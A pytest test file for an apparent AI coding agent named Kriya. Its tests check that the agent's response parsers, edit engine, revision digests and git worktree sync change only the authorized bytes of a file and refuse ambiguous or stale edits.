"""FILE-INTEGRITY-CONTRACT-001: Kriya never silently alters file bytes outside
the exact authorized mutation, and the verified bytes are the committed bytes.

Every test here reproduces a mechanism measured before the fix
(handover/FILE_INTEGRITY_CONTRACT_001.md, "pre-fix measurement"), through the
production boundary that now owns it:

* response protocol  - kriya/agents/response_protocol.py (+ DeveloperAgent.parse_file_payload)
* edit engine        - kriya/workflow/file_integrity.py (+ edit_safety.apply_anchored_edits)
* revisions / commit - edit_safety.read_file_revision, terminal_commit
* sandbox sync       - kriya/workflow/worktree.py
"""
import ast
import os
import random
import re
import subprocess
from contextlib import closing
from pathlib import Path
from unittest.mock import patch

import pytest

from kriya.agents.agent import DeveloperAgent
from kriya.agents.response_protocol import (
    AMBIGUOUS_FILE_RESPONSE_PROTOCOL,
    CONFLICTING_DEVELOPER_RESPONSE,
    EDITS,
    FILE,
    INVALID,
    INVALID_EDIT_PROTOCOL,
    MODEL_EDIT_PROTOCOL_INVALID,
    NO_CHANGE,
    parse_legacy_repair,
    parse_raw_payload,
    parse_structured,
)
from kriya.config.config import AppConfig
from kriya.workflow.edit_safety import (
    StagedFileWrite,
    apply_anchored_edits,
    commit_revision_grounded_batch,
    read_file_revision,
)
from kriya.workflow.file_integrity import (
    ANCHOR_AMBIGUOUS,
    ANCHOR_NOT_FOUND,
    ANCHOR_NOT_IN_FILE,
    EMPTY_SEARCH_BLOCK,
    INDENTATION_STYLE_MISMATCH,
    MIXED_NEWLINE_UNSUPPORTED,
    OVERLAPPING_EDITS,
    SOURCE_CHANGED_SINCE_AUTHORIZATION,
    SYMLINK_TARGET_UNSUPPORTED,
    UNSUPPORTED_TEXT_ENCODING,
    WORKTREE_CONTENT_MISMATCH,
    WORKTREE_SYNC_FAILED,
    AnchoredReplace,
    FileIntegrityError,
    apply_line_block_edits,
    keep_final_newline_state,
    load_snapshot,
    mutate_snapshot,
    raw_digest,
    read_shown_text,
    require_unchanged,
)

ROOT = Path(__file__).resolve().parents[1]

# ---------------------------------------------------------------- corpus (§21)

CORPUS = {
    "README.md": b"# Title\n\nProse with ``` inline.\n\n```python\nx = 1\n```\n\nMore prose.\n\n```bash\nrun\n```\n",
    "docs/guide.md": b"Intro `code` and ```not a fence``` in prose.\n\n    ```indented\n",
    "pkg/fenced_doc.py": b'"""Usage:\n\n    ```python\n    run()\n    ```\n"""\n\n\ndef run():\n    return 1\n',
    "pkg/codes.py": b"CODES = {\n    200: 'ok',\n    404: 'nf',\n}\n",
    "pkg/doctest.py": b'def f():\n    """\n    >>> f()\n    1\n    """\n    return 1\n',
    "pkg/tabs.py": b"def f():\n\tif True:\n\t\treturn 1\n\treturn 0\n",
    "pkg/u2028.py": 's = "a\u2028b"\nt = 1\n'.encode("utf-8"),
    "pkg/formfeed.py": b's = "a\x0cb"\n\x0c\nt = 1\n',
    "pkg/nofinal.py": b"x = 1\ny = 2",
    "pkg/crlf.py": b"a = 1\r\nb = 2\r\n\r\nc = 3\r\n",
    "pkg/bom.py": b"\xef\xbb\xbfx = 1\ny = 2\n",
    "src/App.java": b"package com.example;\r\n\r\npublic class App {\r\n    String x = \"<!-- a -- b -->\";\r\n}\r\n",
    "src/Unicode.java": "// caf\u00e9 \u2014 \u65e5\u672c\npackage p;\nclass Unicode {\n\tint a;\n    int b;\n}".encode("utf-8"),
    "api.yaml": b"responses:\n  200:\n    description: ok\n\n  404:\n    description: nf\nsearch: enabled\nreplace: never\nnote: |\n  line one\n\n  line three\n",
    "pom.xml": b'<?xml version="1.0"?>\n<project>\n  <!-- deps -- pinned -->\n  <modelVersion>4.0.0</modelVersion>\n</project>\n',
    "beans.xml": b'<beans xmlns="http://www.springframework.org/schema/beans">\n  <bean id="a" class="A"/>\n</beans>\n',
    "app.properties": "greeting=h\u00e9llo\nurl: http\\://x\npath=C\\:\\\\dir\nkey = a=b\n".encode("utf-8"),
}
MARKDOWN = {"README.md", "docs/guide.md"}


def _write(root: Path, rel: str, data: bytes) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


def _unique_line(text: str) -> str:
    lines = text.split("\n")
    for line in lines:
        if line.strip() and lines.count(line) == 1 and len(line.strip()) > 2:
            return line
    raise AssertionError("no unique line")


def assert_only_authorized_bytes_changed(before: bytes, after: bytes, start: int, end: int) -> None:
    """§23: bytes before the authorized span [start, end) of ``before`` and
    bytes after it are identical in ``after``; only the span may differ."""
    tail = len(before) - end
    assert after[:start] == before[:start], "bytes before the authorized span changed"
    assert after[len(after) - tail:] == before[end:], "bytes after the authorized span changed"
    assert len(after) >= start + tail


def _line_span(raw: bytes, start_line: int, end_line: int):
    offsets = [0]
    for index, byte in enumerate(raw):
        if byte == 0x0A:
            offsets.append(index + 1)
    offsets.append(len(raw))
    return offsets[start_line], offsets[min(end_line, len(offsets) - 1)]


# ---------------------------------------------------------------- #1 largest fence


def test_issue1_markdown_prose_with_fences_is_never_reduced_to_a_block():
    text = CORPUS["README.md"].decode()
    parsed = DeveloperAgent.parse_file_payload(text, "README.md")
    assert parsed.kind == FILE and parsed.content == text


def test_issue1_prose_around_a_fence_is_refused_not_guessed():
    parsed = DeveloperAgent.parse_file_payload("Here is the file:\n```python\nx = 1\n```\nHope it helps.\n", "a.py")
    assert parsed.kind == INVALID and parsed.reason_code == AMBIGUOUS_FILE_RESPONSE_PROTOCOL


def test_issue1_column0_docstring_fence_is_refused_not_extracted():
    text = '"""Usage:\n\n```python\nimport m\n```\n"""\n\ndef run():\n    return 1\n'
    parsed = DeveloperAgent.parse_file_payload(text, "m.py")
    assert parsed.kind == INVALID and parsed.reason_code == AMBIGUOUS_FILE_RESPONSE_PROTOCOL


def test_issue1_one_outer_fence_is_the_only_unwrapped_wrapper():
    parsed = DeveloperAgent.parse_file_payload("\n```python\ndef f():\n    return 1\n```\n\n", "a.py")
    assert parsed.kind == FILE and parsed.content == "def f():\n    return 1"


def test_issue1_nested_fence_in_a_markdown_wrapper_is_ambiguous():
    text = "```markdown\n# T\n```bash\nrun\n```\ntext\n```\n"
    parsed = DeveloperAgent.parse_file_payload(text, "README.md")
    assert parsed.kind == FILE and parsed.content == text  # markdown: fences are content, verbatim


# ---------------------------------------------------------------- #2 gutter, #3 xml, #4 FILE CONTENT


@pytest.mark.parametrize("name", ["pkg/codes.py", "pkg/doctest.py", "api.yaml", "src/App.java", "app.properties", "pom.xml"])
def test_issue2_3_4_payload_that_resembles_gutters_xml_comments_or_markers_is_byte_identical(name):
    text = CORPUS[name].decode("utf-8")
    parsed = DeveloperAgent.parse_file_payload(text, name)
    assert parsed.kind == FILE and parsed.content == text


@pytest.mark.parametrize("payload", [
    "responses:\n    200:\n      description: ok\n    404:\n      description: nf\n",
    "x = (a\n>> 8)\n",
    'def f():\n    """\n>>> f()\n1\n"""\n',
    "   12: numbered-looking but real\n",
])
def test_issue2_numbered_or_shift_lines_survive_every_protocol(payload):
    assert DeveloperAgent.parse_file_payload(payload, "f.yaml").content == payload
    repaired = parse_legacy_repair(f"FIX ANALYSIS: x\nFILE CONTENT:\n{payload}", "f.yaml", patch_allowed=False)
    assert repaired.kind == FILE and repaired.content == payload.rstrip("\n")  # edges are framing
    structured = parse_structured(f'<<<KRIYA:FILE path="f.yaml">>>\n{payload}<<<KRIYA:END_FILE>>>\n', "f.yaml")
    assert structured.kind == FILE and structured.content == payload


def test_issue3_invalid_xml_is_not_repaired_and_the_structural_gate_rejects_it():
    from kriya.workflow.edit_safety import find_structural_corruption

    xml = "<project>\n  <!-- --add-opens flags -->\n</project>\n"
    parsed = DeveloperAgent.parse_file_payload(xml, "pom.xml")
    assert parsed.content == xml
    assert find_structural_corruption("pom.xml", parsed.content) is not None


def test_issue4_file_content_phrase_inside_payload_never_truncates():
    response = "FIX ANALYSIS: fix\nFILE CONTENT:\ndef f():\n    '''\n    File content: bytes\n    '''\n    return 1\n"
    parsed = parse_legacy_repair(response, "f.py", patch_allowed=False)
    assert parsed.content == "def f():\n    '''\n    File content: bytes\n    '''\n    return 1"


def test_issue4_file_content_marker_must_be_an_exact_line():
    response = "FIX ANALYSIS: fix\nCorrected file content for 'A.java':\nclass A {}\n"
    parsed = parse_legacy_repair(response, "A.java", patch_allowed=False)
    assert parsed.kind == INVALID and parsed.reason_code == MODEL_EDIT_PROTOCOL_INVALID


def test_issue4_second_file_content_marker_is_ambiguous():
    response = "FIX ANALYSIS: x\nFILE CONTENT:\na\nFILE CONTENT:\nb\n"
    parsed = parse_legacy_repair(response, "f.txt", patch_allowed=False)
    assert parsed.kind == INVALID and parsed.reason_code == CONFLICTING_DEVELOPER_RESPONSE


# ---------------------------------------------------------------- #5 NO CHANGE NEEDED


def test_issue5_no_change_phrase_in_source_keeps_the_mutation():
    file_response = "FIX ANALYSIS: guard\nFILE CONTENT:\n# no change needed for callers\ndef f(x):\n    return max(x, 0)\n"
    parsed = parse_legacy_repair(file_response, "f.py", patch_allowed=False)
    assert parsed.kind == FILE and "max(x, 0)" in parsed.content
    edit_response = "FIX ANALYSIS: x\nSEARCH:\n    return x\nREPLACE:\n    # No changes needed upstream\n    return max(x, 0)\n"
    parsed = parse_legacy_repair(edit_response, "f.py", patch_allowed=True)
    assert parsed.kind == EDITS and "No changes needed upstream" in parsed.edits[0][1]


def test_issue5_no_change_protocol_line_is_recognized_alone():
    parsed = parse_legacy_repair("FIX ANALYSIS: caller only.\nNO CHANGE NEEDED: the bug is in B.java\n", "A.java", patch_allowed=True)
    assert parsed.kind == NO_CHANGE and parsed.analysis == "caller only."


def test_issue5_no_change_together_with_a_mutation_is_conflicting():
    for response in ("FIX ANALYSIS: r\nNO CHANGE NEEDED: x\nSEARCH:\nfoo\nREPLACE:\nbar\n",
                     "FIX ANALYSIS: r\nSEARCH:\nfoo\nREPLACE:\nbar\nNO CHANGE NEEDED: x\n",
                     "FIX ANALYSIS: r\nFILE CONTENT:\nfoo\nNO CHANGE NEEDED: x\n"):
        parsed = parse_legacy_repair(response, "f.py", patch_allowed=True)
        assert parsed.kind == INVALID and parsed.reason_code == CONFLICTING_DEVELOPER_RESPONSE, response


# ---------------------------------------------------------------- #6 markers


def test_issue6_yaml_search_replace_keys_stay_in_the_replacement():
    response = "FIX ANALYSIS: x\nSEARCH:\nconfig:\n  mode: a\nREPLACE:\nconfig:\n  mode: b\n  search: enabled\n  replace: never\n"
    parsed = parse_legacy_repair(response, "c.yaml", patch_allowed=True)
    assert parsed.edits == (("config:\n  mode: a", "config:\n  mode: b\n  search: enabled\n  replace: never"),)


def test_issue6_docstring_marker_word_stays_in_the_replacement():
    response = 'FIX ANALYSIS: x\nSEARCH:\ndef f():\n    return 1\nREPLACE:\ndef f():\n    """\n    Search: the index\n    """\n    return 2\n'
    parsed = parse_legacy_repair(response, "f.py", patch_allowed=True)
    assert parsed.kind == EDITS and parsed.edits[0][1].endswith("return 2")


def test_issue6_multiple_pairs_parse_deterministically():
    response = "FIX ANALYSIS: x\nSEARCH:\na = 1\nREPLACE:\na = 2\nSEARCH:\nb = 1\nREPLACE:\nb = 2\n"
    assert parse_legacy_repair(response, "f.py", patch_allowed=True).edits == (("a = 1", "a = 2"), ("b = 1", "b = 2"))


@pytest.mark.parametrize(("response", "code"), [
    ("FIX ANALYSIS: x\nSEARCH:\nfoo\n", INVALID_EDIT_PROTOCOL),                       # no REPLACE
    ("FIX ANALYSIS: x\nREPLACE:\nfoo\n", INVALID_EDIT_PROTOCOL),                      # REPLACE first
    ("FIX ANALYSIS: x\nSEARCH:\na\nREPLACE:\nb\nREPLACE:\nc\n", INVALID_EDIT_PROTOCOL),
    ("FIX ANALYSIS: x\nSEARCH:\na\nSEARCH:\nb\nREPLACE:\nc\n", INVALID_EDIT_PROTOCOL),  # nested SEARCH
    ("FIX ANALYSIS: x\nSEARCH:\na\nREPLACE: <?xml version=\"1.0\"?>\n", INVALID_EDIT_PROTOCOL),  # same-line marker
    ("FIX ANALYSIS: x\nSEARCH:\na\nREPLACE:\nb\nFILE CONTENT:\nwhole\n", CONFLICTING_DEVELOPER_RESPONSE),
    ("FIX ANALYSIS: prose only, search: and replace: mentioned\n", MODEL_EDIT_PROTOCOL_INVALID),
    ("FIX ANALYSIS: x\nSEARCH:\na\nREPLACE:\nb\n\nCorrected file content for 'A.java':\n```java\nclass A {}\n```\n",
     AMBIGUOUS_FILE_RESPONSE_PROTOCOL),
])
def test_issue6_malformed_legacy_protocol_is_refused_typed(response, code):
    parsed = parse_legacy_repair(response, "A.java", patch_allowed=True)
    assert parsed.kind == INVALID and parsed.reason_code == code
    assert parsed.error.startswith(f"{code}: ")


def test_issue6_a_single_fence_around_an_edit_block_is_a_wrapper_indentation_exact():
    response = ("FIX ANALYSIS: x\nSEARCH:\n```python\n        if m:\n            v = 1\n```\n"
                "REPLACE:\n```python\n        if m:\n            v = 2\n```\n")
    parsed = parse_legacy_repair(response, "f.py", patch_allowed=True)
    assert parsed.edits == (("        if m:\n            v = 1", "        if m:\n            v = 2"),)


def test_issue6_gutter_echo_fails_typed_never_stripped():
    source = "import a;\nimport b;\n"
    parsed = parse_legacy_repair("FIX ANALYSIS: x\nSEARCH:\n>> 2: import b;\nREPLACE:\nimport c;\n", "A.java",
                                 patch_allowed=True)
    assert parsed.edits == ((">> 2: import b;", "import c;"),)
    with pytest.raises(FileIntegrityError) as raised:
        apply_anchored_edits(source, parsed.edit_dicts(), "")
    assert raised.value.reason_code == ANCHOR_NOT_FOUND


# ---------------------------------------------------------------- structured protocol (§15)


def test_structured_file_and_edit_blocks_are_exact():
    payload = "a\n<<not a sentinel>>\n  SEARCH:\n"
    parsed = parse_structured(f'Analysis.\n<<<KRIYA:FILE path="f.txt">>>\n{payload}<<<KRIYA:END_FILE>>>\n\n', "f.txt")
    assert parsed.kind == FILE and parsed.content == payload and parsed.analysis == "Analysis."
    parsed = parse_structured(
        '<<<KRIYA:EDIT path="f.py">>>\n<<<KRIYA:SEARCH>>>\n  a = 1\n<<<KRIYA:REPLACE>>>\n  a = 2\n'
        "<<<KRIYA:SEARCH>>>\nb\n<<<KRIYA:REPLACE>>>\n<<<KRIYA:END_EDIT>>>\n", "f.py")
    assert parsed.kind == EDITS and parsed.edits == (("  a = 1", "  a = 2"), ("b", ""))


@pytest.mark.parametrize(("response", "code"), [
    ('<<<KRIYA:FILE path="other.py">>>\nx\n<<<KRIYA:END_FILE>>>\n', INVALID_EDIT_PROTOCOL),
    ('<<<KRIYA:FILE path="f.py">>>\nx\n', INVALID_EDIT_PROTOCOL),
    ('<<<KRIYA:FILE path="f.py">>>\n<<<KRIYA:SEARCH>>>\n<<<KRIYA:END_FILE>>>\n', INVALID_EDIT_PROTOCOL),
    ('<<<KRIYA:FILE path="f.py">>>\nx\n<<<KRIYA:END_FILE>>>\ntrailing prose\n', INVALID_EDIT_PROTOCOL),
    ('<<<KRIYA:NO_CHANGE path="f.py">>>\n<<<KRIYA:FILE path="f.py">>>\nx\n<<<KRIYA:END_FILE>>>\n',
     CONFLICTING_DEVELOPER_RESPONSE),
    ('<<<KRIYA:EDIT path="f.py">>>\n<<<KRIYA:SEARCH>>>\na\n<<<KRIYA:END_EDIT>>>\n', INVALID_EDIT_PROTOCOL),
    ('<<<KRIYA:bogus>>>\n', INVALID_EDIT_PROTOCOL),
    ("just prose\n", MODEL_EDIT_PROTOCOL_INVALID),
])
def test_structured_malformed_protocol_is_refused_typed(response, code):
    parsed = parse_structured(response, "f.py")
    assert parsed.kind == INVALID and parsed.reason_code == code


def test_structured_protocol_is_the_default_and_the_selection_is_security_authority():
    from kriya.agents.response_protocol import (
        DEFAULT_RESPONSE_PROTOCOL,
        developer_response_protocol,
        response_protocol_identity,
    )
    from kriya.config.authority import _SECURITY_AUTHORITY_FIELDS

    assert AppConfig().autonomy.developer_response_protocol == "structured" == DEFAULT_RESPONSE_PROTOCOL
    assert response_protocol_identity(AppConfig()) == "kriya_sentinel_v1"
    assert ("autonomy", "developer_response_protocol") in _SECURITY_AUTHORITY_FIELDS
    cfg = AppConfig()
    cfg.autonomy.developer_response_protocol = "legacy_strict"
    assert developer_response_protocol(cfg) == "legacy_strict"
    assert response_protocol_identity(cfg) == "strict_legacy_v1"
    with pytest.raises(ValueError):
        AppConfig(autonomy={"developer_response_protocol": "heuristic"})


# ---------------------------------------------------------------- #7 encoding / newlines


def _commit_edit(path: Path, edits):
    snapshot = load_snapshot(str(path))
    text, data = mutate_snapshot(snapshot, edits)
    commit_revision_grounded_batch([StagedFileWrite(
        target_path=str(path), content=text, base_path=str(path),
        expected_base_revision=snapshot.raw_sha256, content_bytes=data,
    )])
    return path.read_bytes()


@pytest.mark.parametrize(("raw", "search", "replace", "expected"), [
    (b"a = 1\r\nb = 2\r\nc = 3\r\n", "b = 2", "b = 20", b"a = 1\r\nb = 20\r\nc = 3\r\n"),
    (b"x = 1\n  y = 2", "x = 1", "x = 10", b"x = 10\n  y = 2"),
    (b's = "a\x0cb"\nx = 1\n', "x = 1", "x = 10", b's = "a\x0cb"\nx = 10\n'),
    ('s = "a\u2028b"\nx = 1\n'.encode(), "x = 1", "x = 10", 's = "a\u2028b"\nx = 10\n'.encode()),
    (b"\xef\xbb\xbfx = 1\r\n", "x = 1", "x = 10", b"\xef\xbb\xbfx = 10\r\n"),
    (b"a\rb\nx = 1\n", "x = 1", "x = 2", b"a\rb\nx = 2\n"),  # a lone CR is payload
])
def test_issue7_edits_preserve_encoding_newlines_and_final_newline(tmp_path, raw, search, replace, expected):
    path = _write(tmp_path, "f.py", raw)
    assert _commit_edit(path, [{"search": search, "replace": replace}]) == expected


@pytest.mark.parametrize(("raw", "code"), [
    (b"# caf\xe9\nx = 1\n", UNSUPPORTED_TEXT_ENCODING),
    (b"a = 1\r\nx = 1\n", MIXED_NEWLINE_UNSUPPORTED),
    (b"a\r\r\nx = 1\r\n", MIXED_NEWLINE_UNSUPPORTED),   # not reproducible from its text view
])
def test_issue7_unrepresentable_files_are_refused_and_left_untouched(tmp_path, raw, code):
    path = _write(tmp_path, "f.py", raw)
    with pytest.raises(FileIntegrityError) as raised:
        _commit_edit(path, [{"search": "x = 1", "replace": "x = 2"}])
    assert raised.value.reason_code == code
    assert path.read_bytes() == raw


def test_issue7_a_symlink_is_never_mutated_as_text(tmp_path):
    _write(tmp_path, "real.py", b"x = 1\n")
    os.symlink("real.py", tmp_path / "link.py")
    with pytest.raises(FileIntegrityError) as raised:
        load_snapshot(str(tmp_path / "link.py")).require_mutable()
    assert raised.value.reason_code == SYMLINK_TARGET_UNSUPPORTED


def test_issue7_whole_file_replacement_keeps_convention_and_final_newline_state(tmp_path):
    crlf = load_snapshot(str(_write(tmp_path, "a.py", b"old\r\n")))
    assert crlf.encode(keep_final_newline_state(crlf, "new\nline")) == b"new\r\nline\r\n"
    assert crlf.encode(keep_final_newline_state(crlf, "new\r\nline\r\n")) == b"new\r\nline\r\n"
    none = load_snapshot(str(_write(tmp_path, "b.py", b"old")))
    assert none.encode(keep_final_newline_state(none, "new\n")) == b"new"
    new = load_snapshot(str(tmp_path / "absent.py"))
    with pytest.raises(FileIntegrityError) as raised:
        new.encode("a\r\nb\n")
    assert raised.value.reason_code == MIXED_NEWLINE_UNSUPPORTED


def test_issue7_splitting_is_on_newline_only():
    text = 's = "a\u2028b\x0cc\x1cd"\nx = 1\n'
    result = apply_line_block_edits(text, [AnchoredReplace("e", "x = 1", "x = 2")])
    assert result.text == 's = "a\u2028b\x0cc\x1cd"\nx = 2\n'
    assert result.applied[0].start_line == 1


# ---------------------------------------------------------------- #10 revision identity


def test_issue10_revisions_are_raw_byte_digests(tmp_path):
    pairs = [(b"x\xff\n", b"x\xfe\n"), (b"a\r\nb\r\n", b"a\nb\n"), (b"\xef\xbb\xbfa\n", b"a\n")]
    for left, right in pairs:
        a, b = _write(tmp_path, "l", left), _write(tmp_path, "r", right)
        assert read_file_revision(str(a)) == raw_digest(left) != read_file_revision(str(b)) == raw_digest(right)
    assert read_file_revision(str(tmp_path / "missing")) == raw_digest(b"")


def test_issue10_a_source_changed_since_authorization_is_refused(tmp_path):
    path = _write(tmp_path, "f.py", b"x = 1\n")
    authorized = load_snapshot(str(path)).raw_sha256
    path.write_bytes(b"x = 1\r\n")  # same text view, different bytes
    with pytest.raises(FileIntegrityError) as raised:
        require_unchanged(load_snapshot(str(path)), authorized)
    assert raised.value.reason_code == SOURCE_CHANGED_SINCE_AUTHORIZATION


def test_issue10_the_batch_writer_refuses_a_stale_raw_base(tmp_path):
    from kriya.workflow.edit_safety import FileRevisionConflict

    path = _write(tmp_path, "f.py", b"x = 1\n")
    snapshot = load_snapshot(str(path))
    path.write_bytes(b"x = 1\r\n")
    with pytest.raises(FileRevisionConflict):
        commit_revision_grounded_batch([StagedFileWrite(str(path), "y\n", str(path), snapshot.raw_sha256)])
    assert path.read_bytes() == b"x = 1\r\n"


def test_issue10_shown_text_revision_of_undecodable_file_never_equals_a_text_revision(tmp_path):
    from kriya.workflow.edit_safety import content_revision

    path = _write(tmp_path, "f.py", b"caf\xe9\n")
    text, revision = read_shown_text(str(path))
    assert revision.startswith("raw:") and revision != content_revision(text)


# ---------------------------------------------------------------- #8 / #9 anchors


@pytest.mark.parametrize(("source", "search", "code"), [
    ("limit = 10\nprint(limit)\n", "it = 1", ANCHOR_NOT_FOUND),                     # substring only
    ("a = 1\n", "b = 1", ANCHOR_NOT_FOUND),
    ("x = 1\ny = 2\nx = 1\n", "x = 1", ANCHOR_AMBIGUOUS),
    ("a = 1\n", "", EMPTY_SEARCH_BLOCK),
    ("a = 1\n", "\n\n", EMPTY_SEARCH_BLOCK),
    ("def f():\n    a = 1\n\n\n    b = 2\n", "a = 1\nb = 2", ANCHOR_NOT_FOUND),       # blank lines are not collapsed
    ("def f():\n\tif x:\n\t\ta = 1\n", "    if x:\n        a = 1", INDENTATION_STYLE_MISMATCH),
])
def test_issue8_9_anchor_failures_are_typed(source, search, code):
    with pytest.raises(FileIntegrityError) as raised:
        apply_line_block_edits(source, [AnchoredReplace("e", search, "z")])
    assert raised.value.reason_code == code


def test_issue9_overlapping_edits_are_refused():
    with pytest.raises(FileIntegrityError) as raised:
        apply_line_block_edits("a\nb\nc\n", [AnchoredReplace("1", "a\nb", "x"), AnchoredReplace("2", "b\nc", "y")])
    assert raised.value.reason_code == OVERLAPPING_EDITS


def test_issue9_edits_locate_against_the_source_not_each_others_output():
    with pytest.raises(FileIntegrityError) as raised:
        apply_line_block_edits("a\n", [AnchoredReplace("1", "a", "b"), AnchoredReplace("2", "b", "c")])
    assert raised.value.reason_code == ANCHOR_NOT_FOUND


def test_issue9_tolerant_match_reindents_deterministically_and_keeps_blank_lines():
    source = "class A:\n    def f(self):\n        a = 1\n\n        return a\n"
    result = apply_line_block_edits(source, [AnchoredReplace(
        "e", "def f(self):\n    a = 1\n\n    return a", "def f(self):\n    a = 2\n\n    return a")])
    assert result.text == "class A:\n    def f(self):\n        a = 2\n\n        return a\n"
    assert result.applied[0].tolerant
    tabs = "def f():\n\tif x:\n\t\ta = 1\n"
    result = apply_line_block_edits(tabs, [AnchoredReplace("e", "if x:\n\ta = 1", "if x:\n\ta = 2")])
    assert result.text == "def f():\n\tif x:\n\t\ta = 2\n"
    with pytest.raises(FileIntegrityError) as raised:  # spaces into a tab-indented block
        apply_line_block_edits(tabs, [AnchoredReplace("e", "if x:\n\ta = 1", "if x:\n    a = 2")])
    assert raised.value.reason_code == INDENTATION_STYLE_MISMATCH
    compile(apply_line_block_edits(tabs, [AnchoredReplace("e", "\ta = 1", "\ta = 3")]).text, "t.py", "exec")


def test_issue8_search_outside_the_shown_context_is_refused():
    with pytest.raises(FileIntegrityError) as raised:
        apply_anchored_edits("a = 1\n", [{"search": "zzz = 9", "replace": "q"}], "shown: a = 1")
    assert raised.value.reason_code == ANCHOR_NOT_IN_FILE


# ---------------------------------------------------------------- §22 / §23 corpus properties


@pytest.mark.parametrize("name", sorted(CORPUS))
def test_noop_roundtrip_is_byte_identical_across_the_corpus(tmp_path, name):
    raw = CORPUS[name]
    path = _write(tmp_path, name, raw)
    snapshot = load_snapshot(str(path))
    text = snapshot.text
    assert snapshot.encode(text) == raw
    # parse/serialize boundary: every protocol returns the payload or refuses
    for parsed in (
        DeveloperAgent.parse_file_payload(text, name),
        parse_legacy_repair(f"FIX ANALYSIS: noop\nFILE CONTENT:\n{text}", name, patch_allowed=False),
        parse_structured(f'<<<KRIYA:FILE path="{name}">>>\n{text if text.endswith(chr(10)) else text + chr(10)}'
                         "<<<KRIYA:END_FILE>>>\n", name),
    ):
        if parsed.kind == INVALID:
            assert parsed.reason_code == AMBIGUOUS_FILE_RESPONSE_PROTOCOL and name not in MARKDOWN
            continue
        assert snapshot.encode(keep_final_newline_state(snapshot, parsed.content)) == raw
    # an exact replacement whose REPLACE equals its SEARCH
    line = _unique_line(text)
    new_text, data = mutate_snapshot(snapshot, [{"search": line, "replace": line}])
    assert data == raw and raw_digest(data) == snapshot.raw_sha256
    # candidate staging
    commit_revision_grounded_batch([StagedFileWrite(str(path), new_text, str(path), snapshot.raw_sha256,
                                                    content_bytes=data)])
    assert path.read_bytes() == raw


@pytest.mark.parametrize("name", sorted(CORPUS))
def test_only_the_authorized_span_changes_across_the_corpus(tmp_path, name):
    raw = CORPUS[name]
    snapshot = load_snapshot(str(_write(tmp_path, name, raw)))
    line = _unique_line(snapshot.text)
    result = apply_line_block_edits(snapshot.text, [AnchoredReplace("e", line, "CHANGED = 1")])
    after = snapshot.encode(result.text)
    applied = result.applied[0]
    start, end = _line_span(raw, applied.start_line, applied.end_line)
    assert_only_authorized_bytes_changed(raw, after, start, end)
    assert after != raw


def test_locality_helper_catches_a_change_outside_the_span():
    with pytest.raises(AssertionError):
        assert_only_authorized_bytes_changed(b"a\nb\nc\n", b"a\nB\nC\n", 2, 4)


# ---------------------------------------------------------------- §25 parser fuzz


_FUZZ_PIECES = [
    "SEARCH:", "REPLACE:", "FILE CONTENT:", "NO CHANGE NEEDED", "FIX ANALYSIS:", "search:", "  SEARCH:",
    "Search: x", "file content: y", "no change needed", "```", "```python", "   ```", ">> 3: x", "   4: y",
    "<!-- a -- b -->", "<<<KRIYA:FILE", '<<<KRIYA:FILE path="f.py">>>', "<<<KRIYA:END_FILE>>>",
    "<<<KRIYA:SEARCH>>>", "\u2028", "\x0c", "caf\u00e9", "\t", "", "x = 1", "\r",
]


@pytest.mark.parametrize("seed", range(60))
def test_fuzz_parsers_return_substrings_of_the_response_or_refuse(seed):
    rng = random.Random(seed)
    response = "\n".join(rng.choice(_FUZZ_PIECES) + rng.choice(["", " z", "\u00e9"]) for _ in range(rng.randint(1, 14)))
    for parsed in (parse_raw_payload(response, "f.py"), parse_legacy_repair(response, "f.py", patch_allowed=True),
                   parse_structured(response, "f.py")):
        if parsed.kind == INVALID:
            assert parsed.reason_code and parsed.error
            continue
        if parsed.kind == FILE:
            assert parsed.content.rstrip("\n") in response
        for search, replace in parsed.edits:
            assert search in response and replace in response


@pytest.mark.parametrize("seed", range(40))
def test_fuzz_valid_structured_payloads_survive_exactly(seed):
    rng = random.Random(1000 + seed)
    lines = [rng.choice(_FUZZ_PIECES[:-8]) + rng.choice(["", "a", " \u2028"]) for _ in range(rng.randint(0, 10))]
    lines = [line for line in lines if not line.startswith("<<<KRIYA:")]
    payload = "".join(line + "\n" for line in lines)
    parsed = parse_structured(f'why\n<<<KRIYA:FILE path="f.py">>>\n{payload}<<<KRIYA:END_FILE>>>\n', "f.py")
    assert parsed.kind == FILE and parsed.content == payload


@pytest.mark.parametrize("seed", range(40))
def test_fuzz_legacy_payload_with_marker_words_that_are_not_exact_lines(seed):
    rng = random.Random(2000 + seed)
    words = ["search: a", "Search:", "  SEARCH:", "SEARCH: same line", "replace: b", "file content: c",
             "no change needed", "x = 1", "    return 2", "\u00e9\u2028"]
    replace = "\n".join(rng.choice(words) for _ in range(rng.randint(1, 8)))
    parsed = parse_legacy_repair(f"FIX ANALYSIS: z\nSEARCH:\nanchor\nREPLACE:\n{replace}\n", "f.yaml", patch_allowed=True)
    assert parsed.kind == EDITS and parsed.edits == (("anchor", replace.strip("\n")),)


# ---------------------------------------------------------------- #12 worktree sync (§14)


def _git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    _git(root, "init", "-q")
    _git(root, "config", "user.email", "t@example.invalid")
    _git(root, "config", "user.name", "T")
    return root


NAMES = ["caf\u00e9.txt", "tab\there.txt", "sp ace.txt", "new\nline.txt", "plain.txt"]


def test_issue12_sync_copies_every_uncommitted_change_exactly(repo):
    from kriya.workflow.worktree import create_git_worktree, git_status_entries

    for name in NAMES + ["gone.txt", "old.txt"]:
        (repo / name).write_bytes(b"v1\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    for name in NAMES:
        (repo / name).write_bytes(b"v2\r\n\xff")
    (repo / "gone.txt").unlink()
    _git(repo, "mv", "old.txt", "renamed \u00e9.txt")
    (repo / "untracked dir").mkdir()
    (repo / "untracked dir" / "n\u00e9w.txt").write_bytes(b"u\n")
    codes = {path: code for code, path, _original in git_status_entries(str(repo))}
    assert codes["gone.txt"].strip() == "D" and codes["untracked dir/n\u00e9w.txt"] == "??"
    assert any(original == "old.txt" for _c, _p, original in git_status_entries(str(repo)))

    worktree = Path(create_git_worktree(str(repo)))
    for name in NAMES:
        assert (worktree / name).read_bytes() == b"v2\r\n\xff", name
    assert not (worktree / "gone.txt").exists()
    assert not (worktree / "old.txt").exists()
    assert (worktree / "renamed \u00e9.txt").read_bytes() == b"v1\n"
    assert (worktree / "untracked dir" / "n\u00e9w.txt").read_bytes() == b"u\n"


